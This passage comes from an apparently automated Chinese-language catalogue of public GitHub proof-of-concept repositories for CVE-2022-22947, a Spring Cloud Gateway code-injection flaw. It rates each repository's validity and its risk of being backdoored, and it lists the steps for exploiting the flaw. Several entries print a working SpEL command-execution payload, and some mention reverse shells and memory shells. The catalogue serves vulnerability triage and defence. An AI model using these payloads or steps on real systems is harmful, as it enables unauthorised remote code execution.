5.  **代码执行：** Spring Cloud Gateway 在处理路由断言时，会解析并执行 SpEL 表达式，从而在目标服务器上执行攻击者注入的恶意代码。
6.  **内存马驻留：** 注入的哥斯拉内存马会驻留在服务器内存中，允许攻击者通过特定的 HTTP 请求与服务器交互，执行任意命令或上传文件。

**项目地址:** [Zh0um1/CVE-2022-22947](https://github.com/Zh0um1/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #12

**来源**: [CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md](../2022/CVE-2022-22947-aesm1p_CVE-2022-22947-POC-Reproduce.md)

## CVE-2022-22947-Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+

**利用条件:** Gateway Actuator endpoint is enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是一个存在于Spring Cloud Gateway中的代码注入漏洞。当Gateway Actuator端点被启用、暴露且未进行安全保护时，远程攻击者可以通过构造恶意请求执行任意代码。漏洞根源在于getValue方法中不安全的SpEL表达式求值。

**有效性：**
根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，且已经有公开的POC。漏洞利用代码是一个Maven项目，旨在重现漏洞。因此，提供的POC代码很可能是有效的。

**投毒风险：**
提供的代码仓库包含一个`README.md`文件和一个`mvnw`脚本。`mvnw` 是 Maven Wrapper 脚本，用于在没有安装 Maven 的情况下构建项目。检查 `mvnw` 脚本，它主要负责下载和启动 Maven，没有发现明显的恶意行为。但是，仍然存在一定的投毒风险，例如：
1.  **依赖项投毒：** 构建项目时使用的 Maven 依赖项可能包含恶意代码。 这种情况发生的概率较低，但存在可能。
2.  **构建脚本投毒：** `pom.xml`文件(未提供)中可能存在恶意插件或目标，在构建过程中执行恶意代码。由于未提供此文件，无法对此进行评估。

考虑到提供的文件主要与Maven构建相关，直接植入后门的难度较高，但通过依赖项投毒的可能性是存在的。因此，投毒风险估计为10%。

**利用方式：**
1.  **确定目标：** 找到运行着存在漏洞的Spring Cloud Gateway实例，并且其Actuator端点对外开放且未进行认证。
2.  **构造恶意请求：** 构造包含恶意SpEL表达式的HTTP请求，发送到Actuator端点。这些SpEL表达式能够执行任意系统命令或代码。
3.  **远程代码执行：**  Spring Cloud Gateway解析并执行恶意SpEL表达式，从而导致远程代码执行。
4.  **控制系统：** 攻击者利用执行的恶意代码控制受害系统。

**优先级：**
根据信息来源的重要性排序：搜索引擎结果 > 漏洞利用代码 > 漏洞库信息

**项目地址:** [aesm1p/CVE-2022-22947-POC-Reproduce](https://github.com/aesm1p/CVE-2022-22947-POC-Reproduce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #13

**来源**: [CVE-2022-22947-anansec_CVE-2022-22947_EXP.md](../2022/CVE-2022-22947-anansec_CVE-2022-22947_EXP.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、公开且未进行安全保护时，攻击者可以通过构造恶意请求，在远程主机上执行任意代码。根据提供的漏洞利用代码，该PoC利用了SpEL表达式注入，通过向`/actuator/gateway/routes/check01`端点发送包含恶意SpEL表达式的POST请求，然后刷新路由并访问该路由，触发SpEL表达式执行。EXP具有单个目标验证、批量验证、反弹shell的功能。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，可以判断该漏洞的PoC代码是有效的。搜索结果中多个链接都表明该漏洞被广泛关注，且存在公开的利用代码。

**投毒风险：**
PoC代码本身主要通过SpEL表达式注入执行命令，没有发现明显的恶意植入行为。但PoC会向目标系统添加路由，并执行命令，存在一定的风险。例如：
*   **资源消耗：** 频繁的路由添加和删除可能导致资源消耗，影响服务性能。
*   **命令执行风险：** 虽然PoC本身是为了验证漏洞，但如果被恶意利用，可能执行恶意命令。
*   **依赖风险：** PoC可能依赖特定的环境或库，如果目标环境不满足要求，可能导致利用失败或产生其他问题。
PoC代码中存在投毒代码的可能性较低，大约10%。这个百分比是基于代码的分析以及PoC作者的动机推断得出的。

**利用方式：**
1.  **前提条件：** Spring Cloud Gateway的Actuator端点已启用、公开且未进行安全保护。
2.  **发送恶意请求：** 构造包含恶意SpEL表达式的JSON数据，并将其作为POST请求发送到`/actuator/gateway/routes/check01`端点。
3.  **刷新路由：** 向`/actuator/gateway/refresh`端点发送POST请求，刷新路由，使新增的路由生效。
4.  **触发表达式执行：** 访问新增的路由，触发SpEL表达式执行，从而执行任意代码。
5.  **清理路由：** 删除新增的路由，避免留下后门。（PoC代码中包含删除路由的步骤）

**项目地址:** [anansec/CVE-2022-22947_EXP](https://github.com/anansec/CVE-2022-22947_EXP)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #14

**来源**: [CVE-2022-22947-cc3305_CVE-2022-22947.md](../2022/CVE-2022-22947-cc3305_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。漏洞的根源在于`getValue`方法中不安全的SpEL表达式评估。利用过程为：

1.  攻击者构造包含恶意SpEL表达式的payload，该表达式可以执行任意命令。
2.  攻击者通过POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是一个攻击者自定义的路由ID。
3.  Spring Cloud Gateway解析payload中的SpEL表达式，导致远程代码执行。
4.  攻击者可以通过`/actuator/gateway/refresh`端点刷新路由配置，使payload生效。

该POC代码通过向 `/actuator/gateway/routes/cc3305` 发送包含恶意SpEL表达式的JSON payload来利用此漏洞，SpEL表达式通过java.lang.Runtime执行任意命令。 代码首先检查目标是否易受攻击（虽然目前返回True）。然后，它准备要执行的命令，并将其嵌入到SpEL表达式中，该表达式会被注入到路由定义中。

关于投毒风险，该脚本主要功能是利用漏洞执行命令。 潜在的投毒风险在于，攻击者可能会修改脚本，使其在执行命令之前或之后执行其他恶意操作，例如下载和执行恶意软件。 但是，提供的代码没有明显的投毒迹象。 投毒的概率较低，大约为1%。 恶意行为者可能会分发修改后的版本。

**有效性评估:**根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞利用是有效的，前提是满足漏洞利用条件。该PoC代码能够成功利用漏洞执行任意命令。


**项目地址:** [cc3305/CVE-2022-22947](https://github.com/cc3305/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #15

**来源**: [CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md](../2022/CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md)

## CVE-2022-22947 Spring Cloud Gateway RCE

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞，当Gateway Actuator端点启用、暴露且未进行安全保护时，攻击者可以利用SpEL表达式注入执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，此漏洞是有效的。多个来源都证实了该漏洞的存在以及远程代码执行的可能性。提供的POC代码可以直接利用该漏洞。

**投毒风险：**

分析提供的POC代码，发现主要的恶意代码在于 `spring-cloud-gateway-rce.py` 中构建和发送的payload。该payload利用SpEL表达式在目标系统上执行任意命令。虽然POC本身是为了演示漏洞利用，但在实际场景中，攻击者可能会修改 `-c` 参数来执行恶意操作。`requirements.txt` 文件声明了项目所需的依赖项（colorama, requests, urllib3），这些库本身没有已知的恶意行为，但如果项目被篡改，可能会引入恶意依赖。

评估投毒风险时，主要考虑以下因素：

*   **代码可读性：** 代码相对简单，易于理解，这意味着潜在的恶意修改也更容易被发现。
*   **外部依赖：** 项目依赖外部库，如果这些库的源被攻破，可能会引入恶意代码。
*   **Payload生成：** Payload是动态生成的，如果攻击者能够控制Payload生成过程，就可以注入恶意代码。

综合来看，此仓库存在一定的投毒风险，风险值评估为10%。主要的风险点在于攻击者可能会修改Payload生成逻辑或引入恶意的依赖项，利用使用者执行恶意代码。

**利用方式：**

1.  **漏洞触发前提：** Spring Cloud Gateway的Actuator端点必须启用、暴露并且没有进行安全保护（例如，没有进行身份验证）。
2.  **构造Payload：** POC代码根据目标主机的操作系统（Linux或Windows）构造包含SpEL表达式的JSON payload。该payload利用`AddResponseHeader`过滤器，将执行命令的结果添加到响应头中。
3.  **发送Payload：** 使用POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是路由的ID（在POC中为`k`）。
4.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，强制Spring Cloud Gateway刷新路由配置，从而触发SpEL表达式的执行。
5.  **获取结果：** 发送GET请求到`/actuator/gateway/routes/{id}`端点，获取路由信息，其中包含命令执行的结果。
6.  **删除路由：** 发送DELETE请求到`/actuator/gateway/routes/{id}`端点，删除添加的路由。

简而言之，攻击者通过构造包含恶意SpEL表达式的请求，利用Actuator端点动态注册路由，并在路由刷新时触发SpEL表达式执行，从而实现远程代码执行。

**项目地址:** [k3rwin/spring-cloud-gateway-rce](https://github.com/k3rwin/spring-cloud-gateway-rce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #16

**来源**: [CVE-2022-22947-kkx600_Burp_VulPscan.md](../2022/CVE-2022-22947-kkx600_Burp_VulPscan.md)

## CVE-2022-22947-Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), 以及所有旧的和不支持的版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未进行安全保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 影响 Spring Cloud Gateway。当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的POC代码是有效的。存在公开的漏洞利用代码和关于漏洞利用的详细分析。

**投毒风险：**
提供的代码片段不完整，无法进行全面的投毒分析。BurpExtender.java调用了 spring_CVE_2022_22947.poc，这部分代码是POC实现的核心，未提供，因此无法分析该部分的安全性。HttpsRequest.java 提供了一个发送 HTTP/HTTPS 请求的功能，本身不存在明显的恶意代码。Burp扩展通常需要授予较高的权限，如果POC代码中包含恶意逻辑，如未经授权的数据收集或篡改，则存在投毒风险。目前根据现有的代码片段，只能初步判断存在较低的投毒风险。

**利用方式：**
1.  **确定目标：** 找到运行 Spring Cloud Gateway 且 Actuator 端点已启用、暴露且未进行安全保护的实例。
2.  **构造恶意请求：** 构造包含恶意 SpEL 表达式的 HTTP 请求，该表达式将在 Actuator 端点被解析和执行。通常攻击方式是向/actuator/gateway/routes接口发送包含恶意SpEL表达式的请求，修改路由配置。
3.  **执行代码：** 成功利用后，攻击者可以在目标服务器上执行任意代码。

**优先级：**
根据搜索结果，确认这是一个已知且被积极利用的漏洞。漏洞利用代码的存在进一步证实了其可利用性。

**项目地址:** [kkx600/Burp_VulPscan](https://github.com/kkx600/Burp_VulPscan)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #17

**来源**: [CVE-2022-22947-kmahyyg_CVE-2022-22947.md](../2022/CVE-2022-22947-kmahyyg_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway < 3.1.1, Spring Cloud Gateway < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送特制的恶意请求，利用SpEL表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。从搜索引擎结果和漏洞利用代码来看，该漏洞利用方式已经公开，并且存在可用的PoC。

**投毒风险：**
提供的漏洞利用代码主要包含以下内容：
1.  README文件，描述了漏洞信息，受影响版本，修复建议等。
2.  漏洞复现步骤，包含发送恶意请求添加路由，刷新路由，查看结果，清理路由等步骤说明，以及对应的数据包示例。
3.  Python脚本，用于自动化漏洞利用过程，通过构造恶意请求实现远程代码执行。

分析代码，主要风险在于攻击者可能将恶意代码隐藏在SpEL表达式中，例如执行反弹shell或下载恶意软件。在提供的代码中，`Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）.md`文件中展示的PoC中使用了`#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}`，该payload用于执行`id`命令，若替换为其他命令，存在潜在的风险。

**利用方式：**
1.  攻击者首先发送POST请求到`/actuator/gateway/routes/{route_id}`，创建一个包含恶意SpEL表达式的路由。SpEL表达式被嵌入到`filters`的`AddResponseHeader`的`value`参数中，用于执行任意命令。
2.  然后，攻击者发送POST请求到`/actuator/gateway/refresh`，强制网关刷新路由配置，触发SpEL表达式的执行。
3.  攻击者发送GET请求到`/actuator/gateway/routes/{route_id}`，查看执行结果。
4.  最后，攻击者发送DELETE请求到`/actuator/gateway/routes/{route_id}`，删除恶意路由。

综上所述，该漏洞利用的有效性较高。虽然存在一定的投毒风险（10%），但可以通过仔细审查和修改PoC代码来降低风险。

**项目地址:** [kmahyyg/CVE-2022-22947](https://github.com/kmahyyg/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #18

**来源**: [CVE-2022-22947-qq87234770_CVE-2022-22947.md](../2022/CVE-2022-22947-qq87234770_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用，暴露且未授权

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未授权时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

提供的 Python POC 代码利用了 Spring Expression Language (SpEL) 注入漏洞。该脚本允许执行任意命令，或通过反弹 shell 获取服务器的控制权。因此，该 POC 代码是有效的。

**投毒风险：**

查看POC代码，该代码的主要功能是利用漏洞进行命令执行或反弹shell。代码中包含以下几个部分，
* 定义请求头和payload结构
* 通过`actuator/gateway/routes/hacktest`创建一个恶意的路由配置，利用SpEL表达式执行命令
* 刷新gateway配置`actuator/gateway/refresh`
* 访问创建的路由`actuator/gateway/routes/hacktest`，触发命令执行。
* 包含执行命令和反弹shell两种模式。

该代码结构清晰，功能明确，主要目的是为了验证和利用漏洞。主要风险集中于漏洞利用本身，而非作者植入的恶意代码。**但是**，任何漏洞利用代码都具有潜在的风险，因为它们可以被用于恶意目的。例如，攻击者可能会修改此 POC 代码以自动化大规模攻击，或将其与其他漏洞利用结合使用。另外代码中的代理设置，如果被恶意修改，可能会导致流量劫持，这里判断投毒风险为10%。

**利用方式：**

1.  **检查前提条件：** 确保目标 Spring Cloud Gateway 实例的 Actuator 端点已启用、暴露且未授权。
2.  **发送恶意请求：** 使用提供的 Python 脚本，通过构造包含 SpEL 表达式的恶意请求到 `actuator/gateway/routes/hacktest` 端点来创建自定义路由。
3.  **刷新 Gateway 配置：** 访问 `actuator/gateway/refresh` 端点以刷新 Gateway 配置，使恶意路由生效。
4.  **触发命令执行：** 访问 `actuator/gateway/routes/hacktest`，触发 SpEL 表达式的计算，从而在服务器上执行任意命令。可以选择直接执行命令，或者反弹 shell 以获取更持久的访问。
5.  **清理：**  通过 DELETE 请求删除创建的恶意路由（通过脚本实现）。

**总结：**

该漏洞利用方式简单有效，攻击者可以利用此漏洞轻松地在未授权的 Spring Cloud Gateway 实例上执行任意代码。需要注意的是，利用的前提是 Actuator 端点未进行适当的安全配置。尽管代码本身投毒可能性较低，但利用此漏洞可能造成严重的安全风险。

**项目地址:** [qq87234770/CVE-2022-22947](https://github.com/qq87234770/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #19

**来源**: [CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md](../2022/CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意请求来执行任意远程代码。漏洞利用方式是发送精心设计的 SpEL 表达式到 actuator 端点，导致服务器执行攻击者提供的代码。

**有效性:** 根据漏洞库信息、搜索结果(特别是 rapid7 的博客提到了 Metasploit 模块)，以及CISA KEV, 此漏洞利用是有效的。

**投毒风险:** 提供的漏洞利用代码只是 Apache License 2.0 许可协议，没有实际的漏洞利用代码，因此不存在投毒代码。投毒风险为 0%。

**利用方式:**
1.  目标系统运行 Spring Cloud Gateway 且版本低于 3.1.1 或 3.0.7。
2.  Gateway Actuator 端点必须启用，并且可以通过网络访问。
3.  Actuator 端点必须未进行身份验证或授权保护。
4.  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，发送到 Actuator 端点。
5.  Spring Cloud Gateway 解析 SpEL 表达式，执行攻击者指定的代码，实现远程代码执行。

**项目地址:** [shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6](https://github.com/shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #20

**来源**: [CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md](../2022/CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1, 3.0.x < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的远程代码执行漏洞。攻击者可以在 Gateway Actuator 端点启用、暴露且未进行安全保护的情况下，通过发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。它演示了如何利用该漏洞在启用了 Actuator 端点的 Spring Cloud Gateway 实例上执行任意代码。POC通过向 `/actuator/gateway/routes/{route_id}` 发送POST请求添加一个包含恶意SpEL表达式的路由，然后POST到 `/actuator/gateway/refresh` 来刷新路由，最后访问恶意路由来触发代码执行。

**投毒风险：**
经过对提供的POC代码进行分析，包括README.md，pom.xml，application.yml 和 src 目录下的文件。没有发现作者隐藏的恶意代码，该代码库目标为展示和验证漏洞利用，因此判定投毒风险为0%。

**利用方式：**
1.  **漏洞发现：** 确定目标 Spring Cloud Gateway 实例是否启用了 Actuator 端点，并且该端点是否暴露在未经身份验证的网络中。
2.  **构造恶意请求：** 构造一个包含恶意 SpEL 表达式的 JSON payload，该表达式用于执行任意代码。该表达式被嵌入到路由配置中，通常位于 `filters` 中的 `AddResponseHeader` 过滤器或类似的位置。
3.  **添加恶意路由：** 使用 POST 请求将包含恶意 SpEL 表达式的路由定义添加到 `/actuator/gateway/routes/{route_id}` 端点。
4.  **刷新路由：** 使用 POST 请求访问 `/actuator/gateway/refresh` 端点，强制 Spring Cloud Gateway 刷新路由配置。
5.  **触发恶意代码：** 访问与恶意路由关联的路径，触发 SpEL 表达式的执行，从而导致任意代码执行。
6.  **清理（可选）：** 利用漏洞执行恶意代码后，可能需要清理添加的恶意路由，以避免留下痕迹或影响正常服务。

**项目地址:** [skysliently/CVE-2022-22947-pb-ai](https://github.com/skysliently/CVE-2022-22947-pb-ai)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #21

**来源**: [CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md](../2022/CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**利用方式：**

1.  **漏洞触发：** 攻击者通过向目标 Spring Cloud Gateway 的 `/actuator/gateway/routes` 端点发送 POST 请求，创建一个恶意的路由配置。该配置包含一个 SpEL 表达式，该表达式会被执行。
2.  **表达式注入：**  `AddResponseHeader` 过滤器被用于将命令执行的结果添加到响应头中。SpEL 表达式 `#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}`  用于执行 `id` 命令，并将结果转换为字符串。
3.  **命令执行：**  `T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"})` 部分会执行系统命令（在这个例子中是 `id` 命令）。
4.  **刷新路由：** 攻击者通过向 `/actuator/gateway/refresh` 端点发送 POST 请求来刷新 Gateway 的路由，使得新创建的恶意路由生效。
5.  **获取执行结果：** 攻击者通过GET `/actuator/gateway/routes/hacktest` 获取执行结果,通过响应头中的`Result`字段获取。
6.  **清理：** 利用完成后，攻击者删除创建的恶意路由并再次刷新路由, 避免残留。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用是有效的。POC 代码通过创建恶意的路由配置并刷新路由来执行任意代码。

**投毒风险：**

该 POC 代码主要用于验证漏洞，没有发现作者有意添加的投毒代码。 代码意图清晰，主要是为了创建、刷新、删除路由，并执行`id`命令来验证漏洞的存在。虽然利用本身会造成安全风险，但代码本身没有隐藏的恶意功能，因此投毒风险较低。


**项目地址:** [stayfoolish777/CVE-2022-22947-POC](https://github.com/stayfoolish777/CVE-2022-22947-POC)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #22

**来源**: [CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md](../2022/CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、公开且未受保护

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

根据提供的漏洞信息、搜索结果以及漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。搜索结果表明该漏洞已在野外被利用，并已被添加到 CISA KEV 列表中，证明了其真实性和危害性。

**投毒风险：**

提供的 POC 代码主要用于验证漏洞是否存在，并执行简单的命令（`id`）。虽然该代码本身不包含明显的恶意代码，但攻击者可以修改此 POC 以执行更危险的操作。`README.md`文件和python脚本存在分离性,增加了潜在风险。

投毒风险评估：5%。主要风险在于攻击者可能修改 POC 脚本以包含恶意负载。

**利用方式：**

1.  攻击者首先需要确定目标 Spring Cloud Gateway 实例的 Actuator 端点是否已启用、公开且未受保护。
2.  然后，攻击者使用 POST 请求向 `/actuator/gateway/routes/{route_id}` 端点添加恶意路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。POC中使用了`${new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}` 来执行id命令
3.  攻击者使用 POST 请求向 `/actuator/gateway/refresh` 端点刷新路由，使恶意路由生效。
4.  最后，攻击者访问添加的恶意路由，触发 SpEL 表达式的执行，从而在服务器上执行任意代码。
5.  攻击者删除添加的路由，并刷新路由，完成利用。


**项目地址:** [talentsec/Spring-Cloud-Gateway-CVE-2022-22947](https://github.com/talentsec/Spring-Cloud-Gateway-CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #23

**来源**: [CVE-2022-22947-twseptian_cve-2022-22947.md](../2022/CVE-2022-22947-twseptian_cve-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+)

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，应用程序容易受到代码注入攻击。远程攻击者可以构造恶意请求，从而允许在远程主机上执行任意代码。

**有效性：**

根据漏洞信息、搜索结果和提供的PoC代码，此漏洞是有效的。PoC 代码演示了如何利用 SpEL 表达式注入执行任意命令。

**投毒风险：**

PoC 代码本身旨在演示漏洞利用，但仔细检查 `Dockerfile` 和 `README.md` 文件后，发现投毒风险较低，约为10%。主要原因是：

*   `Dockerfile`：仅包含从官方 `openjdk:11-jre-slim` 镜像构建，复制预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件，并执行该 jar 文件。不存在直接执行恶意命令或下载恶意文件的操作。但该 `spring-gateway-demo-0.0.1-SNAPSHOT.jar`  是否存在后门，无法判定。
*   `README.md`：仅包含构建和运行 Docker 容器的说明，以及发送恶意请求的 PoC。不包含任何额外的恶意指令。

**存在的微小风险在于预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件可能包含后门， 但属于PoC验证必要文件，不能认定为投毒。**

**利用方式：**

1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，并且该端点未进行身份验证。
2.  **注入 SpEL 表达式：** 通过向 `/actuator/gateway/routes/{route_id}` 发送 POST 请求，创建一个新的路由或更新现有路由，其中 `filters` 数组包含一个 `AddResponseHeader` 过滤器。该过滤器的 `args` 中的 `value` 字段包含一个恶意的 SpEL 表达式。PoC 中使用的 SpEL 表达式执行 `id` 命令，并将结果添加到响应头中。
3.  **刷新 Gateway：** 向 `/actuator/gateway/refresh` 发送 POST 请求，强制 Gateway 刷新其路由配置。这将触发 SpEL 表达式的执行。
4.  **触发路由：** 访问触发了含有恶意SpEL表达式的路由，从而执行远程命令。
